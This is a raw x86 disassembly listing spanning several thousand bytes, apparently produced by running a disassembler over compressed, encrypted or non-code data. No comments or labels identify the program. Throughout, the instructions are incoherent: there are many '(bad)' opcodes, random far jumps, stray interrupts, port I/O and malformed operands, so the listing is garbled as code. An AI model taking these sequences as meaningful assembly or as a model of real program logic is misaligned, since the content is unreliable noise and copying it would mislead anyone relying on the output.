  41756e:	push   eax
  41756f:	(bad)  
  417570:	xor    edx,DWORD PTR [eax-0x7c67be7c]
  417576:	dec    ecx
  417577:	lods   al,BYTE PTR ds:[esi]
  417578:	push   cs
  417579:	push   ebx
  41757a:	add    DWORD PTR [esi+0x3ce48eb7],eax
  417580:	cs jl  0x4175a6
  417583:	mov    dl,0xe9
  417585:	test   BYTE PTR ds:0xfd203242,cl
  41758b:	in     eax,0x4f
  41758d:	(bad)  
  41758e:	jns    0x417579
  417590:	sub    DWORD PTR [edi],ebx
  417592:	push   edi
  417593:	clc    
  417594:	and    DWORD PTR ds:0x7c5e6260,esi
  41759a:	sub    eax,0xdb1f6deb
  41759f:	add    edi,DWORD PTR [ebx-0x76]
  4175a2:	mov    ecx,0x49d9720b
  4175a7:	adc    dl,BYTE PTR [esp+eax*1-0x20ffc84a]
  4175ae:	push   es
  4175af:	repnz mov dh,0x3e
  4175b2:	cmp    esp,DWORD PTR [edx*4-0x4a94e6da]
  4175b9:	pop    eax
  4175ba:	enter  0xc97e,0xa5
  4175be:	or     al,bh
  4175c0:	jle    0x4175b4
  4175c2:	xor    BYTE PTR [ebx+0x7f],bh
  4175c5:	mov    ecx,0x52409246
  4175ca:	sub    BYTE PTR [esi+eiz*8+0x760639f4],cl
  4175d1:	and    dh,BYTE PTR ds:0x365c6e50
  4175d7:	dec    edi
  4175d8:	mov    ch,0xed
  4175da:	stos   BYTE PTR es:[edi],al
  4175db:	dec    esp
  4175dc:	sbb    ah,BYTE PTR [ecx]
  4175de:	jmp    0x34dbdddd
  4175e3:	das    
  4175e4:	inc    edi
  4175e5:	das    
  4175e6:	addr16 pop esp
  4175e8:	popf   
  4175e9:	popf   
  4175ea:	sub    eax,0xa0b17cf7
  4175ef:	lock fiadd DWORD PTR [ecx]
  4175f2:	jne    0x417651
  4175f4:	inc    eax
  4175f5:	add    BYTE PTR [edi],dh
  4175f7:	jno    0x4175fa
  4175f9:	int3   
  4175fa:	mov    eax,0x4036d1d2
  4175ff:	mov    ebx,0xcc40f76c
  417604:	je     0x417654
  417606:	mov    esp,ebx
  417608:	xchg   ebx,eax
  417609:	sar    DWORD PTR [ebx],0x16
  41760c:	lahf   
  41760d:	ds sub ebp,DWORD PTR es:[ebp-0x3b08bbed]
  417615:	sub    esp,DWORD PTR [edi-0x1bd62aa5]
  41761b:	inc    ebx
  41761c:	fwait
  41761d:	xchg   esp,eax
  41761e:	mov    ah,0x67
  417620:	jns    0x417631
  417622:	inc    esp
  417623:	cmp    DWORD PTR [esi-0x69c67358],ebp
  417629:	out    dx,al
  41762a:	arpl   WORD PTR [esi-0x5b174e9a],dx
  417630:	add    ah,BYTE PTR [eax-0x53]
  417633:	mov    bh,0x9
  417635:	mov    al,ds:0x409471f8
  41763a:	mov    edi,0x364e87c8
  41763f:	xor    eax,0x6eb23caf
  417644:	or     BYTE PTR [ebp+0x59],cl
  417647:	int    0xa
  417649:	scas   al,BYTE PTR es:[edi]
  41764a:	in     al,dx
  41764b:	dec    ebx
  41764c:	scas   eax,DWORD PTR es:[edi]
  41764d:	out    dx,al
  41764e:	outs   dx,DWORD PTR ds:[esi]
  41764f:	jg     0x417650
  417651:	out    dx,al
  417652:	push   ebx
  417653:	or     ecx,DWORD PTR [edi-0xb2310a7]
  417659:	mov    esi,0xd891ea5
  41765e:	mov    eax,0x2b7dd453
  417663:	jmp    0x4175fb
  417665:	pop    ecx
  417666:	js     0x4176b4
  417668:	sahf   
  417669:	mov    DWORD PTR [eax+0x37],edx
  41766c:	add    DWORD PTR ds:0x1098a061,ebx
  417672:	inc    esp
  417673:	sub    bh,bh
  417675:	(bad)  
  417676:	pop    ss
  417677:	shl    DWORD PTR [edi+0x6c],cl
  41767a:	pop    es
  41767b:	mov    ebp,0x3311e5fa
  417680:	mov    bh,0x14
  417682:	lods   eax,DWORD PTR ds:[esi]
  417683:	inc    edi
  417684:	jno    0x417677
  417686:	add    ebp,edi
  417688:	mov    dh,al
  41768a:	imul   edx,DWORD PTR [edi+0x4564c04a],0xfef874ba
  417694:	mov    al,ds:0xa2965763
  417699:	arpl   WORD PTR [ecx+0x57],bp
  41769c:	ret    0x83df
  41769f:	push   0xc2e5389f
  4176a4:	mov    ebp,0xd9f5a1f7
  4176a9:	fadd   DWORD PTR [esp+edi*4+0x3d]
  4176ad:	mov    ebx,0x2abb14a3
  4176b2:	jb     0x4176b1
  4176b4:	in     al,dx
  4176b5:	inc    eax
  4176b6:	xchg   esi,eax
  4176b7:	jns    0x41766e
  4176b9:	aad    0x51
  4176bb:	shl    DWORD PTR [esi-0x32],cl
  4176be:	and    bh,dl
  4176c0:	add    edi,DWORD PTR [ecx+0x52]
  4176c3:	jl     0x417743
  4176c5:	icebp  
  4176c6:	adc    al,0xe1
  4176c8:	jmp    0x9f5efa89
  4176cd:	fwait
  4176ce:	data16 aad 0x29
  4176d1:	ret    0xc19e
  4176d4:	dec    esi
  4176d5:	xchg   cl,bh
  4176d7:	jle    0x4176a7
  4176d9:	mov    ah,0xd3
  4176db:	jne    0x4176c3
  4176dd:	mov    eax,ds:0xa5259873
  4176e2:	out    0x34,eax
  4176e4:	mov    esi,0x94231b59
  4176e9:	lods   al,BYTE PTR ds:[esi]
  4176ea:	push   cs
  4176eb:	push   cs
  4176ec:	xchg   esp,eax
  4176ed:	sub    BYTE PTR ds:0xbbb7caf8,al
  4176f3:	jae    0x417768
  4176f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f6:	inc    ebx
  4176f7:	rol    DWORD PTR [ebx],0x70
  4176fa:	lock sub ah,BYTE PTR [edi]
  4176fd:	out    dx,al
  4176fe:	inc    esi
  4176ff:	mov    cl,0x84
  417701:	xchg   esp,edx
  417703:	jbe    0x4176ef
  417705:	test   BYTE PTR [esi+0x62],bl
  417708:	mov    DWORD PTR [eax+0x20e8f602],eax
  41770e:	cmp    dl,dh
  417710:	fist   DWORD PTR ds:0x4bedcb3d
  417716:	retf   
  417717:	push   ds
  417718:	cmc    
  417719:	loope  0x417787
  41771b:	in     eax,0xb3
  41771d:	outs   dx,BYTE PTR fs:[esi]
  41771f:	fs jp  0x417733
  417722:	xchg   ebx,eax
  417723:	push   esp
  417724:	iret   
  417725:	jb     0x41779b
  417727:	xchg   esp,eax
  417728:	pusha  
  417729:	xor    ecx,edi
  41772b:	dec    eax
  41772c:	loopne 0x4176cb
  41772e:	mov    ebp,0xdfdbc61c
  417733:	es inc esp
  417735:	dec    ebp
  417736:	fiadd  DWORD PTR [ebx]
  417738:	fcom   QWORD PTR [ebx-0x35]
  41773b:	in     eax,dx
  41773c:	push   edx
  41773d:	dec    edx
  41773e:	iret   
  41773f:	scas   eax,DWORD PTR es:[edi]
  417740:	int    0xeb
  417742:	adc    bh,ah
  417744:	jmp    0x8136:0xad59cfe3
  41774b:	jmp    0x1289:0xfdbecf9b
  417752:	retf   0x2a9b
  417755:	dec    ebp
  417756:	mov    ch,0x3d
  417758:	cmp    edx,DWORD PTR [eax]
  41775a:	retf   0x9f17
  41775d:	xchg   ebx,eax
  41775e:	jbe    0x417765
  417760:	inc    ebp
  417761:	fsub   QWORD PTR [edx]
  417763:	cdq    
  417764:	sbb    al,0xbf
  417766:	sub    esi,eax
  417768:	fwait
  417769:	ds jmp 0xf026:0x812708e4
  417771:	and    bl,BYTE PTR [esi-0x82fbabc]
  417777:	cmc    
  417778:	mov    al,ds:0xf431f098
  41777d:	gs and eax,0xdd4a9fd8
  417783:	xor    al,bh
  417785:	test   ax,0x68e1
  417789:	adc    dl,BYTE PTR [ecx+0x41]
  41778c:	gs xor dl,dh
  41778f:	int    0x74
  417791:	add    bl,al
  417793:	xchg   ebp,eax
  417794:	and    dh,0xc8
  417797:	retf   0xda05
  41779a:	add    al,0x90
  41779c:	adc    BYTE PTR [ebp-0x67],ch
  41779f:	mov    ebx,0xedfcbca6
  4177a4:	xchg   ebp,eax
  4177a5:	sbb    eax,0xb5d71f7c
  4177aa:	xchg   DWORD PTR [edi],edx
  4177ac:	adc    BYTE PTR [eax],al
  4177ae:	mov    dh,0x74
  4177b0:	add    al,0xbe
  4177b2:	cmp    esp,DWORD PTR [edi-0x573a6829]
  4177b8:	adc    DWORD PTR [ebx-0x55],eax
  4177bb:	sub    al,0xd0
  4177bd:	fs loope 0x41778b
  4177c0:	xchg   DWORD PTR [ebx+0x15227872],ecx
  4177c6:	inc    edx
  4177c7:	cmp    al,0x36
  4177c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177ca:	pop    esp
  4177cb:	push   ds
  4177cc:	scas   eax,DWORD PTR es:[edi]
  4177cd:	adc    eax,0x525b246e
  4177d2:	mov    bh,ah
  4177d4:	aam    0xdd
  4177d6:	je     0x417844
  4177d8:	bound  ebx,QWORD PTR [ebp+0x7a0896cf]
  4177de:	mov    al,ds:0x515bbd69
  4177e3:	adc    eax,0x7e57f84b
  4177e8:	add    eax,0x97d1c6ff
  4177ed:	ret    0x2313
  4177f0:	int3   
  4177f1:	in     al,dx
  4177f2:	mov    ebx,0x42e9f08
  4177f7:	and    DWORD PTR [ecx],0x9f208ec3
  4177fd:	mov    eax,DWORD PTR ds:0xb3cd8560
  417803:	(bad)  
  417804:	sahf   
  417805:	xor    bl,BYTE PTR [edi+0x495f43]
  41780b:	dec    ebp
  41780c:	test   BYTE PTR [edi],dh
  41780e:	push   edi
  41780f:	imul   ebx,DWORD PTR [esp+edx*4],0x7a28c39d
  417816:	(bad)  
  417817:	gs (bad) 
  417819:	cmc    
  41781a:	bound  ebp,QWORD PTR [ebx-0x37]
  41781d:	pop    ebx
  41781e:	push   cs
  41781f:	xchg   si,ax
  417821:	cmp    BYTE PTR [edx],0x14
  417824:	out    dx,al
  417825:	dec    edx
  417826:	inc    eax
  417827:	mov    eax,ds:0x7430320a
  41782c:	add    DWORD PTR ds:0xb844d8b1,0x5ae55d77
  417836:	mov    eax,0x7acb713e
  41783b:	int    0xcc
  41783d:	leave  
  41783e:	retf   
  41783f:	add    ah,dh
  417841:	aaa    
  417842:	or     ah,BYTE PTR [ebx]
  417844:	addr16 popf 
  417846:	mov    eax,ss:0xf8e04cf
  41784c:	out    dx,eax
  41784d:	cli    
  41784e:	enter  0x86c6,0xf9
  417852:	dec    ebx
  417853:	pop    edx
  417854:	add    BYTE PTR [eax+esi*1+0x0],0xf6
  417859:	into   
  41785a:	fisttp DWORD PTR [ebp+0x1d0e2c06]
  417860:	jnp    0x417821
  417862:	xchg   esi,eax
  417863:	mov    edi,esp
  417865:	out    dx,eax
  417866:	mov    bl,0x7f
  417868:	ja     0x41781b
  41786a:	daa    
  41786b:	xchg   ebx,eax
  41786c:	mov    dl,0x36
  41786e:	cwde   
  41786f:	sbb    DWORD PTR [ecx-0x275455b3],eax
  417875:	mov    ah,0x55
  417877:	mov    ch,0x2d
  417879:	and    BYTE PTR [eax],0x43
  41787c:	pushf  
  41787d:	test   eax,0xd964bf69
  417882:	fcomp  DWORD PTR [eax+0x196803f2]
  417888:	xlat   BYTE PTR ds:[ebx]
  417889:	int3   
  41788a:	and    eax,0x90ebd71d
  41788f:	dec    ecx
  417890:	mov    ah,0x14
  417892:	daa    
  417893:	and    BYTE PTR [edx+0x6a],cl
  417896:	jg     0x4178cc
  417898:	repz mov esi,0xd9abf616
  41789e:	retf   0x6136
  4178a1:	daa    
  4178a2:	inc    esp
  4178a3:	or     DWORD PTR [edi-0x580d356],edi
  4178a9:	nop    DWORD PTR ds:[edi-0x2a]
  4178ae:	adc    eax,0x402c7213
  4178b3:	stos   BYTE PTR es:[edi],al
  4178b4:	cmp    eax,0xc05eb9c9
  4178b9:	ds js  0x417929
  4178bc:	aam    0x49
  4178be:	jb     0x417884
  4178c0:	stos   BYTE PTR es:[edi],al
  4178c1:	mov    ds:0x792fbd50,al
  4178c6:	mov    ds:0x83a9833e,al
  4178cb:	pop    edx
  4178cc:	pop    es
  4178cd:	mov    al,0x59
  4178cf:	lock or al,0x52
  4178d2:	push   cs
  4178d3:	add    eax,0xa4eb77aa
  4178d8:	xchg   edi,eax
  4178d9:	fdiv   st,st(2)
  4178db:	repnz cmp al,0x57
  4178de:	mov    esi,0x6ce7266d
  4178e3:	mov    BYTE PTR [ecx],dh
  4178e5:	leave  
  4178e6:	pusha  
  4178e7:	mov    ah,0xf9
  4178e9:	jae    0x417920
  4178eb:	and    eax,0x2c26f319
  4178f0:	sbb    edi,DWORD PTR [edx-0x4e]
  4178f3:	sbb    BYTE PTR [edx-0x4bb850ee],dh
  4178f9:	mov    al,ds:0xba86c22e
  4178fe:	inc    eax
  4178ff:	leave  
  417900:	fwait
  417901:	or     edx,ebp
  417903:	std    
  417904:	mov    dl,0x65
  417906:	ins    DWORD PTR es:[edi],dx
  417907:	cmp    ah,dl
  417909:	or     al,0xc3
  41790b:	inc    DWORD PTR [edi]
  41790d:	jmp    0x41794d
  41790f:	jo     0x4178ff
  417911:	push   edi
  417912:	iret   
  417913:	add    ecx,ebx
  417915:	dec    esi
  417916:	cmp    BYTE PTR [ecx+edx*4],dh
  417919:	pop    ds
  41791a:	mov    dh,0x31
  41791c:	shr    BYTE PTR [eax],cl
  41791e:	lock cmc 
  417920:	jo     0x4178ee
  417922:	test   al,0x39
  417924:	xchg   ecx,eax
  417925:	push   esp
  417926:	dec    edx
  417927:	and    eax,esi
  417929:	xchg   ecx,eax
  41792a:	add    eax,0x77a944cd
  41792f:	mov    DWORD PTR [ebx],0xbc7bcb1d
  417935:	lds    ecx,FWORD PTR [ecx]
  417937:	sbb    BYTE PTR [ebx+0x0],bl
  41793a:	popa   
  41793b:	inc    ebp
  41793c:	add    DWORD PTR [edx],ebp
  41793e:	sbb    BYTE PTR [bp+si],dh
  417941:	mov    ?,WORD PTR [ecx]
  417943:	icebp  
  417944:	icebp  
  417945:	mov    ebp,0xc7a37802
  41794a:	call   0x7385b8db
  41794f:	mov    ebx,0x54183cbc
  417954:	mov    ah,0x9b
  417956:	push   eax
  417957:	push   esi
  417958:	mov    eax,0x445969e9
  41795d:	xchg   BYTE PTR [ebx-0x68d23a6],bh
  417963:	in     eax,0xfd
  417965:	mov    eax,ds:0x2ec359f
  41796a:	inc    esp
  41796b:	add    eax,0x2bed4e27
  417970:	pop    ebx
  417971:	add    DWORD PTR [esi],eax
  417973:	sti    
  417974:	sub    esp,esp
  417976:	or     DWORD PTR [eax+0x66222533],ecx
  41797c:	jl     0x41790f
  41797e:	jl     0x4179bb
  417980:	outs   dx,BYTE PTR gs:[esi]
  417982:	xor    bl,BYTE PTR [ebp+0x5b5c70e1]
  417988:	pop    eax
  417989:	inc    ecx
  41798a:	adc    al,0x31
  41798c:	ins    BYTE PTR es:[edi],dx
  41798d:	sbb    edx,DWORD PTR [ecx]
  41798f:	inc    eax
  417990:	push   ss
  417991:	pop    ebx
  417992:	aas    
  417993:	cmp    DWORD PTR [edi],0x6c
  417996:	xor    eax,0xef703b5f
  41799b:	xchg   edi,eax
  41799c:	sbb    edi,ecx
  41799e:	xor    BYTE PTR [ebp+0x48d87551],al
  4179a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179a5:	push   esi
  4179a6:	fs (bad) 
  4179a8:	es mov esp,0x770e94a
  4179ae:	jle    0x41797f
  4179b0:	pusha  
  4179b1:	hlt    
  4179b2:	nop
  4179b3:	cmp    BYTE PTR [eax],ah
  4179b5:	fld    TBYTE PTR [eax+ecx*2+0x60]
  4179b9:	xlat   BYTE PTR ds:[ebx]
  4179ba:	mov    bh,0xb7
  4179bc:	xchg   ebp,eax
  4179bd:	pop    es
  4179be:	adc    BYTE PTR [esi-0x4b],bh
  4179c1:	mov    al,0xc3
  4179c3:	xor    dl,bl
  4179c5:	ret    0xe095
  4179c8:	xor    dl,BYTE PTR [ecx-0x13]
  4179cb:	out    dx,al
  4179cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179cd:	mov    fs,WORD PTR [eax]
  4179cf:	test   DWORD PTR [esi],edx
  4179d1:	out    dx,eax
  4179d2:	jmp    0x3231:0xe766426
  4179d9:	loope  0x417a52
  4179db:	fstp   TBYTE PTR ds:0x89ff067e
  4179e1:	out    0xd1,al
  4179e3:	loop   0x4179d4
  4179e5:	repz cmp al,0x72
  4179e8:	inc    ebx
  4179e9:	clc    
  4179ea:	fcmovnu st,st(0)
  4179ec:	lods   eax,DWORD PTR ds:[esi]
  4179ed:	and    DWORD PTR [edx],ebp
  4179ef:	in     eax,0xa9
  4179f1:	xchg   esp,eax
  4179f2:	dec    ebx
  4179f3:	jbe    0x4179ae
  4179f5:	fmul   st(5),st
  4179f7:	(bad)  ds:0xf87ad471
  4179fd:	loope  0x417a05
  4179ff:	ficom  DWORD PTR [edi]
  417a01:	jl     0x417a73
  417a03:	ins    BYTE PTR es:[edi],dx
  417a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a05:	adc    DWORD PTR [edi+0x21],edi
  417a08:	mov    ch,0xdd
  417a0a:	mov    eax,0x1474ba44
  417a0f:	fisttp WORD PTR [eax]
  417a11:	mov    ah,0xff
  417a13:	outs   dx,BYTE PTR ds:[esi]
  417a14:	jnp    0x417a0e
  417a16:	pop    ebx
  417a17:	mov    fs,WORD PTR [esi+0x238d032d]
  417a1d:	fsub   st,st(0)
  417a1f:	xor    DWORD PTR [ebp-0x44963115],0xfffffff5
  417a26:	fisub  DWORD PTR [edx-0x2]
  417a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2b:	loopne 0x417a36
  417a2d:	pushf  
  417a2e:	in     eax,dx
  417a2f:	xlat   BYTE PTR ds:[ebx]
  417a30:	cmc    
  417a31:	push   edi
  417a32:	push   eax
  417a33:	outs   dx,DWORD PTR ds:[esi]
  417a34:	pop    ds
  417a35:	dec    eax
  417a36:	shr    BYTE PTR [edi+0x2d2ad887],1
  417a3c:	hlt    
  417a3d:	jmp    0x417a0a
  417a3f:	adc    ch,BYTE PTR [ebp+esi*1+0x6c]
  417a43:	ins    DWORD PTR es:[edi],dx
  417a44:	(bad)  
  417a45:	lock inc esi
  417a47:	outs   dx,BYTE PTR ds:[esi]
  417a48:	iret   
  417a49:	or     bh,BYTE PTR [ecx-0x59]
  417a4c:	in     eax,dx
  417a4d:	mov    eax,ds:0x901683c
  417a52:	or     al,0xa1
  417a54:	pop    esp
  417a55:	and    edx,0x521763ae
  417a5b:	xor    ecx,ebx
  417a5d:	lods   eax,DWORD PTR ds:[esi]
  417a5e:	sub    BYTE PTR [eax+eiz*2-0x6933fa36],al
  417a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a66:	enter  0xcdcd,0xce
  417a6a:	test   al,0x45
  417a6c:	cli    
  417a6d:	clc    
  417a6e:	or     eax,0xbd188f85
  417a73:	(bad)  
  417a74:	out    dx,eax
  417a75:	mov    edi,0x1bace7d7
  417a7a:	or     al,BYTE PTR [ebx]
  417a7c:	mov    BYTE PTR [edx],dh
  417a7e:	inc    ecx
  417a7f:	sahf   
  417a80:	dec    esp
  417a81:	enter  0x1772,0x43
  417a85:	ins    BYTE PTR es:[edi],dx
  417a86:	mov    edi,0xb060b6da
  417a8b:	add    DWORD PTR [edx+0x55],ebx
  417a8e:	nop
  417a8f:	dec    edx
  417a90:	(bad)  
  417a91:	(bad)  [eax+0x4804c415]
  417a97:	or     al,0x7
  417a99:	xchg   esp,eax
  417a9a:	pop    edx
  417a9b:	leave  
  417a9c:	add    cl,ah
  417a9e:	dec    ebp
  417a9f:	xor    bl,0x2d
  417aa2:	nop
  417aa3:	mov    ecx,0xa64f9fcb
  417aa8:	imul   edx,DWORD PTR ds:0xed4269ca,0x378989f4
  417ab2:	adc    al,0x17
  417ab4:	push   0xffffffa1
  417ab6:	and    BYTE PTR [ecx-0xd6ecd42],bl
  417abc:	iret   
  417abd:	mov    WORD PTR [eax+edi*2+0x45],fs
  417ac1:	test   DWORD PTR [edx-0x50],esi
  417ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ac5:	arpl   di,di
  417ac7:	cmc    
  417ac8:	iret   
  417ac9:	and    eax,0x23b3f5fb
  417ace:	cmp    al,0x66
  417ad0:	jae    0x417ad6
  417ad2:	leave  
  417ad3:	mov    ecx,0x36df5f39
  417ad8:	add    al,0x93
  417ada:	dec    esi
  417adb:	push   esp
  417adc:	retf   0x8c61
  417adf:	into   
  417ae0:	jnp    0x417b28
  417ae2:	mov    al,ds:0x15c75ea2
  417ae7:	dec    ebp
  417ae8:	out    0xf3,eax
  417aea:	add    edi,DWORD PTR [ebx-0x63]
  417aed:	repnz aam 0xd4
  417af0:	cmp    eax,0xd24124c1
  417af5:	lahf   
  417af6:	retf   0x6cd3
  417af9:	inc    eax
  417afa:	hlt    
  417afb:	popf   
  417afc:	into   
  417afd:	sub    al,BYTE PTR [ebx]
  417aff:	fild   DWORD PTR [eax]
  417b01:	fcomp  DWORD PTR [ecx+0x74]
  417b04:	mov    ecx,0xa3bfd4c3
  417b09:	leave  
  417b0a:	pusha  
  417b0b:	pop    ds
  417b0c:	mov    dl,0x6d
  417b0e:	dec    BYTE PTR [ecx+edi*1-0x7f]
  417b12:	dec    esi
  417b13:	or     dl,BYTE PTR [edx+0x1a]
  417b16:	aam    0x89
  417b18:	add    BYTE PTR [ebx],dh
  417b1a:	aam    0x6f
  417b1c:	push   ds
  417b1d:	(bad)  
  417b1e:	push   0x34
  417b20:	sub    BYTE PTR [ebp+0x777d17e8],dh
  417b26:	pop    ebx
  417b27:	je     0x417b27
  417b29:	enter  0x6660,0xbb
  417b2d:	sahf   
  417b2e:	retf   0x9170
  417b31:	lahf   
  417b32:	fnstsw WORD PTR [esi+0x3f]
  417b35:	outs   dx,BYTE PTR ds:[esi]
  417b36:	popa   
  417b37:	push   0xf3d9ec9f
  417b3c:	loope  0x417b16
  417b3e:	daa    
  417b3f:	ss inc esp
  417b41:	shl    BYTE PTR [esi+0x25],0xca
  417b45:	jecxz  0x417ad2
  417b47:	add    DWORD PTR [edi+0x6503f65a],ebx
  417b4d:	mov    dl,0xa8
  417b4f:	in     eax,dx
  417b50:	in     eax,dx
  417b51:	push   esi
  417b52:	cmp    al,0x5c
  417b54:	mov    esi,0xd86240d2
  417b59:	or     dl,ch
  417b5b:	cmp    ebp,edx
  417b5d:	pop    ds
  417b5e:	dec    esp
  417b5f:	sbb    eax,0xb4bfbd9d
  417b64:	jne    0x417b1c
  417b66:	jge    0x417b4e
  417b68:	cmp    ebp,DWORD PTR [edx-0x6393833c]
  417b6e:	cmp    ecx,esp
  417b70:	jle    0x417bbc
  417b72:	addr16 into 
  417b74:	pop    edi
  417b75:	jbe    0x417bd7
  417b77:	or     al,0xb0
  417b79:	test   edi,ecx
  417b7b:	es ins DWORD PTR es:[edi],dx
  417b7d:	mov    edi,cs
  417b7f:	dec    edi
  417b80:	sbb    al,0x1c
  417b82:	rcl    DWORD PTR [esi],cl
  417b84:	xchg   BYTE PTR [edx+0x4c],ah
  417b87:	mov    ah,0x48
  417b89:	out    0xcf,eax
  417b8b:	push   ebp
  417b8c:	ja     0x417b26
  417b8e:	loope  0x417bb4
  417b90:	inc    ebp
  417b91:	sti    
  417b92:	add    eax,DWORD PTR [esi]
  417b94:	sbb    edi,esi
  417b96:	out    0x95,eax
  417b98:	adc    ebp,DWORD PTR [edx+eiz*4+0x565fba33]
  417b9f:	clc    
  417ba0:	cmc    
  417ba1:	push   eax
  417ba2:	outs   dx,DWORD PTR ds:[esi]
  417ba3:	mov    esi,eax
  417ba5:	dec    ecx
  417ba6:	mov    esp,DWORD PTR [esi]
  417ba8:	iret   
  417ba9:	or     eax,0xaf72f061
  417bae:	pop    ds
  417baf:	pop    edi
  417bb0:	out    dx,eax
  417bb1:	pop    esp
  417bb2:	mov    dh,0xe7
  417bb4:	mov    dh,0x64
  417bb6:	imul   ebx,DWORD PTR [edx-0x13a48420],0xffffff9d
  417bbd:	push   es
  417bbe:	push   ds
  417bbf:	imul   esi,eax,0x11
  417bc2:	dec    esp
  417bc3:	sub    BYTE PTR [esi],dl
  417bc5:	mov    ch,0x14
  417bc7:	lahf   
  417bc8:	adc    DWORD PTR [esi+0x2580e7f4],ebp
  417bce:	cs cmp al,0xbd
  417bd1:	aad    0xef
  417bd3:	xchg   edi,eax
  417bd4:	push   0x26
  417bd6:	in     al,dx
  417bd7:	push   edi
  417bd8:	stos   DWORD PTR es:[edi],eax
  417bd9:	sub    ebx,DWORD PTR [ebp-0x6e]
  417bdc:	mov    fs,WORD PTR [esi]
  417bde:	dec    esi
  417bdf:	call   0x3cbb:0x8cc2
  417be5:	int    0x8c
  417be7:	into   
  417be8:	and    al,0x5e
  417bea:	inc    eax
  417beb:	fnstenv [eax+0x6a53ed1e]
  417bf1:	aad    0xbf
  417bf3:	loop   0x417c21
  417bf5:	out    0xb,al
  417bf7:	xchg   edi,eax
  417bf8:	jns    0x417bec
  417bfa:	add    edx,ebp
  417bfc:	jo     0x417baf
  417bfe:	jg     0x417c53
  417c00:	sub    eax,0x13b12385
  417c05:	xchg   edx,eax
  417c06:	push   es
  417c07:	repnz int3 
  417c09:	add    DWORD PTR [edx-0x41],ebx
  417c0c:	push   edi
  417c0d:	xor    esi,DWORD PTR [ecx+0x1011e18f]
  417c13:	pop    esp
  417c14:	mov    edx,0xa579a6b
  417c19:	fst    QWORD PTR [edi-0x6b684ef1]
  417c1f:	pop    ebp
  417c20:	jb     0x417c41
  417c22:	and    BYTE PTR [edi-0x79],dl
  417c25:	pop    es
  417c26:	and    al,0x97
  417c28:	and    DWORD PTR [edx-0x1c],esp
  417c2b:	mov    bl,0x68
  417c2d:	mov    WORD PTR [ebp+0x7f],?
  417c30:	jl     0x417bb9
  417c32:	bound  ebp,QWORD PTR [edi-0x72]
  417c35:	add    eax,0x97a1e961
  417c3a:	jle    0x417bda
  417c3c:	enter  0x443d,0x44
  417c40:	fs mov bl,0xf5
  417c43:	retf   
  417c44:	nop
  417c45:	jp     0x417c60
  417c47:	dec    ebx
  417c48:	cmp    bh,dl
  417c4a:	and    DWORD PTR [ebx+0x48284d4],edi
  417c50:	sbb    BYTE PTR [ebp-0x6964f0d],0xa6
  417c57:	nop
  417c58:	(bad)  
  417c59:	dec    DWORD PTR [eax-0x67]
  417c5c:	xor    esi,DWORD PTR [ecx+edi*4]
  417c5f:	xlat   BYTE PTR ds:[ebx]
  417c60:	stos   DWORD PTR es:[edi],eax
  417c61:	retf   
  417c62:	cld    
  417c63:	cmp    eax,0x1fff90a3
  417c68:	dec    edx
  417c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c6a:	pop    es
  417c6b:	ficomp DWORD PTR [edx-0x65]
  417c6e:	fild   QWORD PTR [ecx-0x5a3528b]
  417c74:	loop   0x417cd6
  417c76:	shr    ch,1
  417c78:	sub    DWORD PTR [eax],esp
  417c7a:	js     0x417c0d
  417c7c:	retf   
  417c7d:	call   0x611e:0xad483404
  417c84:	int    0x34
  417c86:	sbb    ebx,DWORD PTR [esi+0x5d]
  417c89:	pop    esp
  417c8a:	cdq    
  417c8b:	fimul  DWORD PTR [ebp-0x47]
  417c8e:	dec    ebx
  417c90:	and    al,0xcd
  417c92:	inc    ebp
  417c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c94:	in     eax,dx
  417c95:	lds    ebx,FWORD PTR [edi+0x4f]
  417c98:	imul   ecx,ecx,0xffffffa6
  417c9b:	punpcklwd mm1,DWORD PTR [ebp-0x8]
  417c9f:	mov    ch,0x6b
  417ca1:	sbb    dh,BYTE PTR [edi]
  417ca3:	shl    ch,cl
  417ca5:	jo     0x417c9a
  417ca7:	fistp  DWORD PTR [edx-0x70]
  417caa:	(bad)  
  417cac:	mov    bh,0x69
  417cae:	mov    ebp,ds
  417cb0:	or     BYTE PTR [ecx-0x6547c568],0xc0
  417cb7:	dec    ecx
  417cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb9:	push   0x4fe5dbb1
  417cbe:	or     BYTE PTR [esi+0x31],0xec
  417cc2:	hlt    
  417cc3:	dec    eax
  417cc4:	push   ds
  417cc5:	(bad)  
  417cc6:	pop    ebx
  417cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc8:	scas   al,BYTE PTR es:[edi]
  417cc9:	mov    al,0x99
  417ccb:	push   ds
  417ccc:	xchg   edi,eax
  417ccd:	test   DWORD PTR [edi*8+0x6f58a98],0xdd92a1c5
  417cd8:	push   ecx
  417cd9:	cmp    edi,DWORD PTR [ebp+0x26]
  417cdc:	mov    esp,0x75a85fad
  417ce1:	aam    0xa
  417ce3:	(bad)  
  417ce4:	dec    esi
  417ce5:	push   ds
  417ce6:	daa    
  417ce7:	inc    ecx
  417ce8:	(bad)  
  417ce9:	jb     0x417ccf
  417ceb:	jnp    0x417cd7
  417ced:	iret   
  417cee:	dec    esp
  417cef:	dec    eax
  417cf0:	push   ebx
  417cf1:	push   es
  417cf2:	cwde   
  417cf3:	aam    0x9e
  417cf5:	gs push ds
  417cf7:	pop    edx
  417cf8:	or     eax,0xbb02cdc1
  417cfd:	pop    ss
  417cfe:	pop    es
  417cff:	into   
  417d00:	imul   ebx,edi,0x35
  417d03:	push   0x29fc9ed5
  417d08:	loop   0x417cba
  417d0a:	hlt    
  417d0b:	jmp    0xf0c25a52
  417d10:	out    0x98,al
  417d12:	push   esp
  417d13:	arpl   WORD PTR ds:0x34cb6dd1,cx
  417d19:	sub    eax,0x85464df0
  417d1e:	fbld   TBYTE PTR [edx+esi*8-0x44bbc818]
  417d25:	jl     0x417cb4
  417d27:	ret    0x275c
